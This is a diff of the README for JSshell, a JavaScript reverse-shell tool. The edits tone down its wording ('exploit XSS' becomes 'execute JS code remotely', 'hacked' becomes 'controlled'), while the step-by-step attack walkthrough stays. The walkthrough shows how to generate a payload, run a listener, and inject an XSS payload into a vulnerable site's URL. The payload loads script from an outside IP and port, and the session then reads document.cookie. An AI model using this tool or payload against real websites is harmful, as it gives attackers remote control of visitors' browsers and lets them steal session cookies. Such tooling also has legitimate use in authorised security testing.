@@ -1,5 +1,5 @@
 # JSshell (version 2.9)
-JSshell - a JavaScript reverse shell. This is used to exploit XSS remotely, help to find blind XSS, ...
+JSshell - a JavaScript reverse shell. This is used to execute JS code remotely, exploit blind XSS, ...
 
 This tool works for both Unix and Windows operating systems, and it can run on both Python 2 + Python 3. This is 
 a big update of JShell - a tool to get a JavaScript shell with XSS by s0med3v. JSshell also doesn't require Netcat (different from JShell).
@@ -23,8 +23,8 @@ js-2.9$ new()
 #### Generate JS reverse shell payload:  `-g`
 #### Set the local port number for listening and generating payload (By default, it will be set to 4848):  `-p`
 #### Set the local source address for generating payload (JSshell will detect your IP address by deault):  `-s`
-#### Set timeout for shell connection (if the user exit page, the shell will be pause, and if your set the timeout, after a while without response, the shell will automatically close):  `-w`
-#### Execute a command when got the shell:  `-c`
+#### Set timeout for shell connection (if the user exit page, the shell will be pause, and if your set the timeout, after a while without response, the shell will automatically be closed):  `-w`
+#### Execute a command after get the shell:  `-c`
 
 #### Example usages:
 - `js.py`
@@ -34,7 +34,7 @@ js-2.9$ new()
 - `js.py -c "alert(document.cookie)" -w 10`
 
 #### An example for running JSshell:
-This is an example for step-by-step to exploit remote XSS using JSshell.
+This is a step-by-step example for how to use JSshell.
 
 First we will generate a reverse JS shell payload and set the shell timeout is 20 seconds:
 
@@ -55,7 +55,7 @@ Payload:
 Listening on [any] 4848 for incoming JS shell ...
 ```
 
-Now paste this payload to the website (or URL) that vulnerable to XSS:
+Now paste this payload to the website (or URL):
 
 `https://vulnwebs1te.com/b/search?q=<svg/onload=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//171.224.181.106:4848"},1248)>`
 
@@ -86,11 +86,11 @@ $
 Now let's execute some commands:
 
 ```
-$ var test = 'hacked'
+$ var test = 'controlled'
 $ alert(test)
 $
 ```
-And the browser got an alert:  `hacked`
+And the browser got an alert:  `controlled`
 
 ```
 $ prompt(document.cookie)
@@ -111,5 +111,5 @@ And we quited!
 
 
 # Author
-This is created by shelld3v, inspired by the BruteLogic payload.
+This is created by [shelld3v](https://github.com/shelld3v)!
 
